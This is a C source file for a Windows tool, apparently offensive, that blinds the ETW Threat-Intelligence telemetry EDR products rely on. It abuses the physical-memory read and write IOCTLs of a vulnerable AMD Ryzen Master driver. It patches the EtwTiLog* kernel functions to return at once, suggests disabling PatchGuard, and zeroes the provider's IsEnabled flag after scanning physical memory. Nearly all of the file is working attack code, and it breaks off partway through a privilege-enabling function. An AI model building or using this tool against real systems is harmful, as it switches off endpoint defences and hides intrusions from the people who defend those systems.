/*
 * etw_ti_bypass.c â€” Deactivate ETW Microsoft-Windows-Threat-Intelligence provider
 *
 * The ETW-TI provider (GUID {F4E1897C-BB5D-5668-F1D8-040F4D8DD344}) emits
 * high-privilege kernel telemetry consumed in real-time by EDR drivers:
 *
 *   EtwTiLogReadWriteVm          NtReadVirtualMemory / NtWriteVirtualMemory
 *   EtwTiLogAllocExecVm          NtAllocateVirtualMemory (executable pages)
 *   EtwTiLogMapExecView          NtMapViewOfSection (executable mapping)
 *   EtwTiLogSetContextThread     NtSetContextThread (thread hijacking)
 *   EtwTiLogSuspendResumeProcess NtSuspendProcess / NtResumeProcess
 *   EtwTiLogOpenProcess          NtOpenProcess (Win11 22H2+)
 *   EtwTiLogOpenThread           NtOpenThread  (Win11 22H2+)
 *
 * â”€â”€ Two complementary methods â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 *
 * Method A â€” Function patch  (primary)
 *   EtwTiLog* functions are exported from ntoskrnl (Win10 1903+).
 *   Patch prologue â†’ xor eax,eax; ret (0x31 0xC0 0xC3)
 *   â†’ function returns 0 immediately, EtwEventWrite is never reached
 *   âš   PatchGuard checks ntoskrnl .text integrity â€” BSOD in ~5-10 min.
 *      Restore before PatchGuard fires, or disable PatchGuard first.
 *
 * Method B â€” Provider data patch  (belt+suspenders, PatchGuard-safe)
 *   Find _ETW_GUID_ENTRY in ntoskrnl data via GUID byte scan.
 *   Zero _ETW_PROVIDER_ENABLE_INFO.IsEnabled.
 *   â†’ EtwTiLog* checks EtwProviderEnabled() â†’ returns early without writing.
 *   No code section modified â†’ PatchGuard does not fire.
 *
 * â”€â”€ Physical address discovery â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 *   ntoskrnl PA: scan 2MB-aligned physical pages for NtBuildNumber export
 *   (same technique as step5_wdfilter_disable.c)
 *
 *   Function PA = ntoskrnl_PA + RVA  (from pe_export_rva on disk image)
 *
 *   Provider entry PA: scan ntoskrnl physical pages for GUID bytes at
 *   offset +0x28 within _ETW_GUID_ENTRY.
 *
 * Build:
 *   x86_64-w64-mingw32-gcc -O2 -Wall -o etw_ti_bypass.exe \
 *       etw_ti_bypass.c -lkernel32 -ladvapi32
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winternl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* â”€â”€ Driver â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
#define DEVICE_NAME      L"\\\\.\\AMDRyzenMasterDriverV20"
#define IOCTL_PHYS_READ  0x81112F08u
#define IOCTL_PHYS_WRITE 0x81112F0Cu
static HANDLE g_dev = INVALID_HANDLE_VALUE;

/* â”€â”€ Physical ranges â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
#define MAX_RANGES 64
typedef struct { uint64_t base, size; } PhysRange;
static PhysRange g_ranges[MAX_RANGES];
static int       g_nranges = 0;

static void load_ranges(void)
{
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
            "HARDWARE\\RESOURCEMAP\\System Resources\\Physical Memory",
            0, KEY_READ, &hKey) != ERROR_SUCCESS) return;
    char vname[256]; DWORD vn, vd, type;
    uint8_t *buf = NULL; DWORD sz = 0;
    for (DWORD i = 0; ; i++) {
        vn = sizeof vname; vd = 0;
        if (RegEnumValueA(hKey,i,vname,&vn,NULL,&type,NULL,&vd) == ERROR_NO_MORE_ITEMS) break;
        if ((type!=3&&type!=8)||vd<20) continue;
        buf = (uint8_t*)malloc(vd);
        if (!buf) continue;
        if (RegQueryValueExA(hKey,vname,NULL,NULL,buf,&vd)==ERROR_SUCCESS){sz=vd;break;}
        free(buf); buf=NULL;
    }
    RegCloseKey(hKey);
    if (!buf||sz<20){free(buf);return;}
    DWORD cnt=*(DWORD*)(buf+16); uint8_t *p=buf+20;
    for (DWORD i=0;i<cnt&&g_nranges<MAX_RANGES;i++,p+=20){
        if(p+20>buf+sz||p[0]!=3) continue;
        g_ranges[g_nranges].base=*(uint64_t*)(p+4);
        g_ranges[g_nranges].size=*(uint64_t*)(p+12);
        g_nranges++;
    }
    free(buf);
}

static int pa_in_range(uint64_t pa, uint32_t sz)
{
    for(int i=0;i<g_nranges;i++)
        if(pa>=g_ranges[i].base&&pa+sz<=g_ranges[i].base+g_ranges[i].size) return 1;
    return 0;
}

/* â”€â”€ Physical I/O â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
static int phys_read(uint64_t pa, void *buf, uint32_t sz)
{
    struct { uint64_t pa; uint32_t sz; } in = {pa,sz};
    uint32_t out_sz=12+sz;
    uint8_t *out=(uint8_t*)calloc(1,out_sz); if(!out) return 0;
    DWORD got=0;
    BOOL ok=DeviceIoControl(g_dev,IOCTL_PHYS_READ,&in,sizeof(in),out,out_sz,&got,NULL);
    if(ok&&got>=12) memcpy(buf,out+12,sz);
    free(out); return ok&&got>=12;
}

static int phys_write(uint64_t pa, const void *data, uint32_t sz)
{
    if(!pa_in_range(pa,sz)) return 0;
    uint32_t in_sz=12+sz;
    uint8_t *in_buf=(uint8_t*)malloc(in_sz); if(!in_buf) return 0;
    *(uint64_t*)in_buf=pa; *(uint32_t*)(in_buf+8)=sz;
    memcpy(in_buf+12,data,sz);
    DWORD got=0;
    BOOL ok=DeviceIoControl(g_dev,IOCTL_PHYS_WRITE,in_buf,in_sz,NULL,0,&got,NULL);
    free(in_buf); return ok;
}

/* â”€â”€ Module list â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
typedef NTSTATUS (NTAPI *PFN_NTQSI)(ULONG,PVOID,ULONG,PULONG);
typedef struct {
    HANDLE Section; PVOID MappedBase,ImageBase;
    ULONG  ImageSize,Flags;
    USHORT LoadOrderIndex,InitOrderIndex,LoadCount,OffsetToFileName;
    CHAR   FullPathName[256];
} MOD_ENTRY;
typedef struct { ULONG NumberOfModules; MOD_ENTRY Modules[1]; } MOD_LIST;

static MOD_LIST *get_module_list(void)
{
    PFN_NTQSI fn=(PFN_NTQSI)GetProcAddress(GetModuleHandleA("ntdll.dll"),"NtQuerySystemInformation");
    if(!fn) return NULL;
    ULONG sz=0x80000; MOD_LIST *ml=NULL; NTSTATUS st;
    do{free(ml);ml=(MOD_LIST*)malloc(sz*=2);st=fn(11,ml,sz,NULL);}
    while(st==(NTSTATUS)0xC0000004L);
    if(st){free(ml);return NULL;} return ml;
}

static uint64_t get_ntoskrnl_va(char *path_out, uint32_t *size_out)
{
    MOD_LIST *ml=get_module_list(); if(!ml) return 0;
    uint64_t va=(uint64_t)ml->Modules[0].ImageBase;
    if(size_out) *size_out=ml->Modules[0].ImageSize;
    if(path_out){
        /* Use the actual loaded kernel filename from the module list.
         * FullPathName is an NT path like \SystemRoot\system32\ntoskrnl.exe.
         * We reconstruct a Win32 path by replacing \SystemRoot with %SystemRoot%. */
        const char *full = ml->Modules[0].FullPathName;
        const char *fname = full + ml->Modules[0].OffsetToFileName;
        char sysdir[MAX_PATH];
        GetSystemDirectoryA(sysdir, sizeof sysdir);
        snprintf(path_out, MAX_PATH, "%s\\%s", sysdir, fname);
        /* Fallback: if file not found (e.g. ntkrnlmp.exe) try ntoskrnl.exe */
        if(GetFileAttributesA(path_out)==INVALID_FILE_ATTRIBUTES){
            snprintf(path_out, MAX_PATH, "%s\\ntoskrnl.exe", sysdir);
        }
    }
    free(ml); return va;
}

/* â”€â”€ PE export RVA lookup â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
static uint32_t pe_export_rva(const uint8_t *pe, size_t fsz, const char *sym)
{
    if(fsz<0x100||pe[0]!='M'||pe[1]!='Z') return 0;
    int32_t elf=*(int32_t*)(pe+0x3C);
    if(elf<=0||(uint32_t)elf+0x90>fsz) return 0;
    uint16_t ns=*(uint16_t*)(pe+elf+6),osz=*(uint16_t*)(pe+elf+20);
    uint32_t sb=(uint32_t)elf+24+osz;

    #define R2F(rva,fo) do{(fo)=0;\
        for(uint16_t _i=0;_i<ns;_i++){\
            uint32_t _s=sb+_i*40,_va=*(uint32_t*)(pe+_s+12);\
            uint32_t _vsz=*(uint32_t*)(pe+_s+16);if(!_vsz)_vsz=*(uint32_t*)(pe+_s+24);\
            uint32_t _fo=*(uint32_t*)(pe+_s+20);\
            if((rva)>=_va&&(rva)<_va+_vsz){(fo)=_fo+((rva)-_va);break;}}\
    }while(0)

    uint32_t erva=*(uint32_t*)(pe+elf+0x88),efo=0; R2F(erva,efo);
    if(!efo||efo+40>fsz) return 0;
    const uint8_t *exp=pe+efo;
    uint32_t nn=*(uint32_t*)(exp+0x18);
    uint32_t rfn=*(uint32_t*)(exp+0x1C),rnm=*(uint32_t*)(exp+0x20),rod=*(uint32_t*)(exp+0x24);
    uint32_t ffn=0,fnm=0,fod=0; R2F(rfn,ffn); R2F(rnm,fnm); R2F(rod,fod);
    if(!ffn||!fnm||!fod) return 0;
    for(uint32_t i=0;i<nn;i++){
        uint32_t nrva=*(uint32_t*)(pe+fnm+i*4),nfo=0; R2F(nrva,nfo);
        if(!nfo||nfo>=fsz) continue;
        if(strcmp((char*)(pe+nfo),sym)==0){
            uint16_t ord=*(uint16_t*)(pe+fod+i*2);
            return *(uint32_t*)(pe+ffn+ord*4);
        }
    }
    #undef R2F
    return 0;
}

/* â”€â”€ Find ntoskrnl PA via 2MB NtBuildNumber scan â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
#define CHUNK 0x10000
static uint8_t g_chunk[CHUNK];

static uint64_t find_ntoskrnl_pa(const char *path)
{
    HANDLE hf=CreateFileA(path,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,0,NULL);
    if(hf==INVALID_HANDLE_VALUE) return 0;
    DWORD fsz=GetFileSize(hf,NULL);
    uint8_t *pe=(uint8_t*)malloc(fsz); DWORD rd=0;
    ReadFile(hf,pe,fsz,&rd,NULL); CloseHandle(hf);

    uint32_t rva=pe_export_rva(pe,fsz,"NtBuildNumber");
    free(pe); if(!rva) return 0;

    uint32_t ssd=*(uint32_t*)(0x7FFE0000+0x260)&0xFFFF;
    uint32_t c0=ssd,c1=ssd|0xF0000000,c2=ssd|0xC0000000;

    const uint64_t STEP=0x200000ULL;
    for(int ri=0;ri<g_nranges;ri++){
        uint64_t base=(g_ranges[ri].base+STEP-1)&~(STEP-1);
        uint64_t end=g_ranges[ri].base+g_ranges[ri].size;
        for(uint64_t pa=base;pa<end;pa+=STEP){
            if(!pa_in_range(pa+rva,4)) continue;
            uint32_t val=0; phys_read(pa+rva,&val,4);
            if(val!=c0&&val!=c1&&val!=c2) continue;
            uint16_t mz=0; phys_read(pa,&mz,2);
            if(mz==0x5A4D){
                printf("    ntoskrnl PA=0x%016llX  (NtBuildNumber=0x%08X)\n",
                       (unsigned long long)pa,val);
                return pa;
            }
        }
    }
    return 0;
}

/* â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 * ETW-TI constants
 * â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• */

/*
 * Microsoft-Windows-Threat-Intelligence GUID: {F4E1897C-BB5D-5668-F1D8-040F4D8DD344}
 * Stored in memory as a _GUID struct (Data1/2/3 little-endian, Data4 big-endian):
 */
static const uint8_t ETW_TI_GUID[16] = {
    0x7C,0x89,0xE1,0xF4,  /* Data1: F4E1897C LE */
    0x5D,0xBB,            /* Data2: BB5D LE */
    0x68,0x56,            /* Data3: 5668 LE */
    0xF1,0xD8,0x04,0x0F,0x4D,0x8D,0xD3,0x44  /* Data4 */
};

/*
 * EtwTiLog* functions exported from ntoskrnl.exe (Win10 1903+).
 * Each emits one category of ETW-TI event consumed by EDRs.
 */
static const char *ETW_TI_FUNCS[] = {
    "EtwTiLogReadWriteVm",          /* NtReadVirtualMemory / NtWriteVirtualMemory */
    "EtwTiLogAllocExecVm",          /* NtAllocateVirtualMemory (exec pages)       */
    "EtwTiLogMapExecView",          /* NtMapViewOfSection (exec mapping)           */
    "EtwTiLogSetContextThread",     /* NtSetContextThread (thread hijack)          */
    "EtwTiLogSuspendResumeProcess", /* NtSuspendProcess / NtResumeProcess          */
    "EtwTiLogOpenProcess",          /* NtOpenProcess (Win11 22H2+)                 */
    "EtwTiLogOpenThread",           /* NtOpenThread  (Win11 22H2+)                 */
    NULL
};

/* xor eax, eax  (0x31 0xC0)  â†’  return value = 0 = STATUS_SUCCESS */
/* ret           (0xC3)                                               */
#define PATCH_LEN 3
static const uint8_t PATCH[PATCH_LEN] = {0x31, 0xC0, 0xC3};

/* â”€â”€ Patched function tracking â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
typedef struct {
    const char *name;
    uint64_t    func_pa;
    uint8_t     orig[PATCH_LEN];
    int         ok;
} PatchedFn;

#define MAX_FN 16
static PatchedFn g_fns[MAX_FN];
static int       g_n_fns = 0;

/* â”€â”€ Provider IsEnabled patch tracking â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
static uint64_t g_isenabled_pa = 0;
static uint32_t g_isenabled_orig = 0;

static volatile int g_patched = 0;

/* â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 * Method A â€” patch EtwTiLog* function prologues
 * â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• */
static int patch_etw_functions(const uint8_t *pe, size_t pe_sz,
                                uint64_t nt_pa)
{
    int patched = 0;
    printf("[A] Patching EtwTiLog* exports â†’ xor eax,eax; ret:\n\n");

    for (int i = 0; ETW_TI_FUNCS[i]; i++) {
        uint32_t rva = pe_export_rva(pe, pe_sz, ETW_TI_FUNCS[i]);
        if (!rva) {
            printf("    %-40s  not exported (skip)\n", ETW_TI_FUNCS[i]);
            continue;
        }
        uint64_t func_pa = nt_pa + rva;
        if (!pa_in_range(func_pa, PATCH_LEN)) {
            printf("    %-40s  PA=0x%016llX  out of range\n",
                   ETW_TI_FUNCS[i], (unsigned long long)func_pa);
            continue;
        }
        if (g_n_fns >= MAX_FN) break;

        PatchedFn *pf = &g_fns[g_n_fns];
        pf->name    = ETW_TI_FUNCS[i];
        pf->func_pa = func_pa;
        pf->ok      = 0;

        if (!phys_read(func_pa, pf->orig, PATCH_LEN)) {
            printf("    %-40s  PA=0x%016llX  read FAILED\n",
                   ETW_TI_FUNCS[i], (unsigned long long)func_pa);
            g_n_fns++;
            continue;
        }

        /* Sanity: first orig byte should look like valid function prologue.
         * Common prologues: 48 (REX.W), 4C (REX.WR), 40 (REX), 55 (PUSH RBP),
         * 56 (PUSH RSI), 41 (REX.B prefix), 53 (PUSH RBX), etc.
         * Reject if already patched (0x31 = XOR) or if it's 0x00 (zeroed page). */
        if (pf->orig[0] == 0x00 || pf->orig[0] == PATCH[0]) {
            printf("    %-40s  PA=0x%016llX  suspicious byte 0x%02X â€” skip\n",
                   ETW_TI_FUNCS[i], (unsigned long long)func_pa, pf->orig[0]);
            g_n_fns++;
            continue;
        }

        if (!phys_write(func_pa, PATCH, PATCH_LEN)) {
            printf("    %-40s  PA=0x%016llX  write FAILED\n",
                   ETW_TI_FUNCS[i], (unsigned long long)func_pa);
            g_n_fns++;
            continue;
        }

        /* Verify */
        uint8_t readback[PATCH_LEN] = {0};
        phys_read(func_pa, readback, PATCH_LEN);
        pf->ok = (memcmp(readback, PATCH, PATCH_LEN) == 0);

        printf("    %-40s  PA=0x%016llX  RVA=0x%06X  orig=%02X%02X%02X  %s\n",
               ETW_TI_FUNCS[i], (unsigned long long)func_pa, rva,
               pf->orig[0], pf->orig[1], pf->orig[2],
               pf->ok ? "PATCHED" : "VERIFY FAILED");

        if (pf->ok) patched++;
        g_n_fns++;
    }
    return patched;
}

static void restore_etw_functions(void)
{
    for (int i = 0; i < g_n_fns; i++) {
        PatchedFn *pf = &g_fns[i];
        if (!pf->ok) continue;
        /* Only restore if our patch is still there */
        uint8_t cur[PATCH_LEN] = {0};
        if (phys_read(pf->func_pa, cur, PATCH_LEN) &&
            memcmp(cur, PATCH, PATCH_LEN) == 0)
            phys_write(pf->func_pa, pf->orig, PATCH_LEN);
    }
}

/* â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 * Method B â€” find _ETW_GUID_ENTRY and zero IsEnabled
 *
 * _ETW_GUID_ENTRY layout (Win10/11 x64, approximate):
 *   +0x000  LIST_ENTRY GuidList       (16 bytes)
 *   +0x010  LIST_ENTRY SiloList       (16 bytes)
 *   +0x020  INT64      RefCount       (8 bytes)
 *   +0x028  GUID       Guid           (16 bytes)  â† scan for ETW_TI_GUID here
 *   +0x038  PVOID      SecurityDescriptor
 *   +0x040  LIST_ENTRY RegListHead    (16 bytes)
 *   +0x050  EX_PUSH_LOCK Lock         (8 bytes)
 *   +0x058  _ETW_PROVIDER_ENABLE_INFO ProviderEnableInfo
 *             +0x000 ULONG IsEnabled  â† zero this  (1 when provider is active)
 *             +0x004 UCHAR Level
 *             +0x008 ULONG64 MatchAnyKeyword
 *             +0x010 ULONG64 MatchAllKeyword
 *
 * Offset of ProviderEnableInfo.IsEnabled varies slightly across builds.
 * We scan [entry+0x050 .. entry+0x0B0] for DWORD == 1 with valid neighbour bytes.
 * â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• */
static int disable_provider_entry(uint64_t nt_pa, uint32_t nt_image_size)
{
    /*
     * _ETW_GUID_ENTRY is a pool allocation â€” NOT inside ntoskrnl's image.
     * The GUID also appears as a literal constant in ntoskrnl .rdata (used
     * by the registration call), so scanning only ntoskrnl pages finds the
     * wrong location. We must scan ALL physical memory.
     *
     * We try several possible offsets of the Guid field within the structure,
     * since the layout changes across Windows builds:
     *   Win10 2004: +0x28   Win11 22H2: may differ
     */
    static const uint32_t GUID_OFFSETS[] = {0x28, 0x20, 0x18, 0x30, 0x38};
    (void)nt_pa; (void)nt_image_size;

    printf("[B] Scanning ALL physical memory for pool-allocated _ETW_GUID_ENTRY...\n");
    printf("    GUID offsets tried: +0x18 +0x20 +0x28 +0x30 +0x38\n\n");

    uint64_t last_prog = 0;
    for (int ri = 0; ri < g_nranges; ri++) {
        uint64_t rend = g_ranges[ri].base + g_ranges[ri].size;
        for (uint64_t cpa = g_ranges[ri].base; cpa < rend; cpa += CHUNK) {
            if (cpa - last_prog >= 0x80000000ULL) {
                printf("  [%5llu MB]\r", (unsigned long long)(cpa >> 20));
                fflush(stdout);
                last_prog = cpa;
            }
            uint64_t csz = rend - cpa;
            if (csz > CHUNK) csz = CHUNK;
            if (!phys_read(cpa, g_chunk, (uint32_t)csz)) continue;

            for (uint64_t off = 0; off + 16 <= csz; off++) {
                if (memcmp(g_chunk + off, ETW_TI_GUID, 16) != 0) continue;

                uint64_t guid_pa = cpa + off;

                for (int oi = 0; oi < 5; oi++) {
                    uint32_t guid_off = GUID_OFFSETS[oi];
                    if (guid_pa < guid_off) continue;
                    uint64_t entry_pa = guid_pa - guid_off;

                    /* GuidList Flink+Blink (entry+0x00, +0x08) must be kernel VAs.
                     * SiloList Flink (entry+0x10) must also be a kernel VA.
                     * flink != blink confirms this is a non-trivial linked list. */
                    uint64_t flink=0, blink=0, sflink=0;
                    phys_read(entry_pa+0x00, &flink,  8);
                    phys_read(entry_pa+0x08, &blink,  8);
                    phys_read(entry_pa+0x10, &sflink, 8);

                    if (flink  < 0xFFFF800000000000ULL) continue;
                    if (blink  < 0xFFFF800000000000ULL) continue;
                    if (sflink < 0xFFFF800000000000ULL) continue;
                    if (flink  == blink) continue;   /* degenerate â€” skip */

                    printf("\n    GUID at PA=0x%016llX  (struct+0x%02X)\n",
                           (unsigned long long)guid_pa, guid_off);
                    printf("    _ETW_GUID_ENTRY PA=0x%016llX\n",
                           (unsigned long long)entry_pa);
                    printf("    GuidList: Flink=0x%016llX  Blink=0x%016llX\n\n",
                           (unsigned long long)flink, (unsigned long long)blink);

                    /* Also validate SecurityDescriptor at guid_pa+0x10 is kernel VA or NULL */
                    uint64_t sd_ptr = 0;
                    phys_read(guid_pa + 0x10, &sd_ptr, 8);
                    if (sd_ptr != 0 && sd_ptr < 0xFFFF800000000000ULL) {
                        printf("    [skip] SecurityDescriptor at +0x%02X is not kernel VA (0x%016llX)\n",
                               guid_off+0x10, (unsigned long long)sd_ptr);
                        continue;
                    }

                    /* Dump 0xC0 bytes for manual analysis */
                    uint8_t region[0xC0] = {0};
                    phys_read(entry_pa, region, sizeof region);
                    printf("    _ETW_GUID_ENTRY dump (+0x00 to +0xBF):\n");
                    for (int row = 0; row < (int)sizeof(region); row += 16) {
                        printf("    +0x%02X: ", row);
                        for (int b = 0; b < 16; b++) printf("%02X ", region[row+b]);
                        printf("\n");
                    }
                    printf("\n");

                    /*
                     * Find IsEnabled = _ETW_PROVIDER_ENABLE_INFO.IsEnabled (ULONG).
                     * Layout after GUID at guid_off:
                     *   +0x10  SecurityDescriptor (PVOID)
                     *   +0x18  RegListHead (LIST_ENTRY, 16 bytes)
                     *   +0x28  Lock (EX_PUSH_LOCK, 8 bytes)
                     *   +0x30  ProviderEnableInfo â†’ IsEnabled (ULONG) here
                     *            +0x00 IsEnabled   ULONG  (1 when active)
                     *            +0x04 Level        UCHAR  (0-5)
                     *            +0x08 MatchAnyKeyword ULONG64
                     *            +0x10 MatchAllKeyword ULONG64
                     *
                     * Validate candidate: IsEnabled==1, Level is 0-5, MatchAny!=0.
                     * Scan [guid_off+0x18 .. guid_off+0x80] in case layout shifted.
                     */
                    printf("    Scanning for _ETW_PROVIDER_ENABLE_INFO.IsEnabled:\n");
                    int found = 0;
                    uint32_t scan_start = guid_off + 0x18;
                    uint32_t scan_end   = guid_off + 0x80;
                    if (scan_end > (uint32_t)sizeof(region)) scan_end = (uint32_t)sizeof(region);

                    for (uint32_t d = scan_start; d + 0x18 <= scan_end; d += 4) {
                        uint32_t is_enabled = *(uint32_t*)(region + d);
                        if (is_enabled != 1) continue;

                        /* Level (UCHAR at d+4) must be 0-5; upper 3 bytes should be 0 */
                        uint8_t  level = region[d + 4];
                        uint32_t level_word = *(uint32_t*)(region + d + 4);
                        if (level > 5 || (level_word >> 8) != 0) continue;

                        /* MatchAnyKeyword at d+8 (ULONG64) â€” non-zero when EDR registered */
                        uint64_t match_any = *(uint64_t*)(region + d + 8);
                        if (match_any == 0) continue; /* disabled provider wouldn't be here */

                        /* MatchAllKeyword at d+0x10 must be <= MatchAny */
                        uint64_t match_all = *(uint64_t*)(region + d + 0x10);
                        if (match_all > match_any) continue;

                        printf("    +0x%03X: IsEnabled=1  Level=%u  MatchAny=0x%016llX  MatchAll=0x%016llX  â† VALID\n",
                               d, level,
                               (unsigned long long)match_any,
                               (unsigned long long)match_all);

                        uint64_t target_pa = entry_pa + d;
                        uint32_t zero = 0;
                        if (phys_write(target_pa, &zero, 4)) {
                            uint32_t rb = 0xDEAD;
                            phys_read(target_pa, &rb, 4);
                            if (rb == 0) {
                                printf("    â†’ ZEROED  PA=0x%016llX  (entry+0x%03X)\n\n",
                                       (unsigned long long)target_pa, d);
                                g_isenabled_pa   = target_pa;
                                g_isenabled_orig = 1;
                                found = 1;
                            } else {
                                printf("    â†’ verify failed (rb=0x%08X)\n", rb);
                            }
                        } else {
                            printf("    â†’ phys_write failed\n");
                        }
                        break; /* take first valid hit */
                    }
                    if (!found)
                        printf("    [!] No valid IsEnabled found â€” dump above for manual inspection\n\n");

                    return found;
                }
            }
        }
    }

    printf("\n    [-] _ETW_GUID_ENTRY not found in physical memory.\n");
    printf("        Provider may not be registered yet, or layout differs.\n\n");
    return 0;
}

static void restore_provider_entry(void)
{
    if (!g_isenabled_pa) return;
    uint32_t cur = 0;
    if (phys_read(g_isenabled_pa, &cur, 4) && cur == 0)
        phys_write(g_isenabled_pa, &g_isenabled_orig, 4);
}

/* â”€â”€ Cache eviction â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
#define EVICT_SIZE (256*1024*1024)
static void cache_evict_once(void)
{
    volatile uint8_t *p=(volatile uint8_t*)
        VirtualAlloc(NULL,EVICT_SIZE,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
    if(!p){Sleep(100);return;}
    for(size_t i=0;i<EVICT_SIZE;i+=64) p[i]=(uint8_t)(i>>6);
    volatile uint64_t s=0;
    for(size_t i=EVICT_SIZE;i>=64;i-=64) s^=p[i-64];
    (void)s;
    VirtualFree((LPVOID)p,0,MEM_RELEASE); Sleep(10);
}
static void cache_evict_multiccd(void)
{
    SYSTEM_INFO si; GetSystemInfo(&si); DWORD ncpu=si.dwNumberOfProcessors;
    HANDLE thr=GetCurrentThread();
    DWORD_PTR orig=SetThreadAffinityMask(thr,1);
    SetThreadAffinityMask(thr,1ULL); Sleep(1); cache_evict_once();
    if(ncpu>1){SetThreadAffinityMask(thr,(DWORD_PTR)1<<(ncpu-1));Sleep(1);cache_evict_once();}
    SetThreadAffinityMask(thr,orig);
}

/* â”€â”€ Restore all â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
static void do_restore(void)
{
    if(!g_patched) return;
    printf("\n[R] Restoring...\n");
    restore_etw_functions();
    restore_provider_entry();
    cache_evict_multiccd();
    g_patched = 0;
    printf("[R] Done.\n\n");
}

static BOOL WINAPI ctrl_handler(DWORD ev)
{
    if(ev==CTRL_C_EVENT||ev==CTRL_BREAK_EVENT||
       ev==CTRL_CLOSE_EVENT||ev==CTRL_LOGOFF_EVENT||ev==CTRL_SHUTDOWN_EVENT){
        if(g_patched){
            printf("\n[!] %s â€” emergency restore...\n",
                   ev==CTRL_C_EVENT?"Ctrl+C":"shutdown");
            fflush(stdout);
            do_restore();
            fflush(stdout);
        }
        return FALSE;
    }
    return FALSE;
}

static void enable_debug_privilege(void)
{
    HANDLE hTok; TOKEN_PRIVILEGES tp={1};
    if(!OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY,&hTok)) return;
